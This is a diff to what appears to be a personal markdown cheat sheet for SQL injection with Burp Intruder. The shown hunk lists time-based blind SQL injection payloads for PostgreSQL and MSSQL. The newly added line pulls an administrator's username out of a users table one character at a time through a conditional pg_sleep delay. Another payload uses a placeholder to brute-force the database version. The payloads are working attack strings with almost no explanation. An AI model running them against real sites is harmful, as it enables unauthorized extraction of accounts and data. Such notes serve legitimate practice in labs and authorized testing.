@@ -32,6 +32,7 @@ For intruder we use cluster bomb, and use the grep option to flag responses we k
 #### sleep examples
 postgresql  
   * `'||pg_sleep(10)--`  
+  *  `||(SELECT+CASE+WHEN+(username='administrator'+and+SUBSTRING(username,+1,+1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users)--`
 mssql  
   * `if 1=1 waitfor delay'0:0:08'--`  
   * `' if(SUBSTRING(VERSION(),'1','0')=='{c}') waitfor delay'0:0:08'--`  
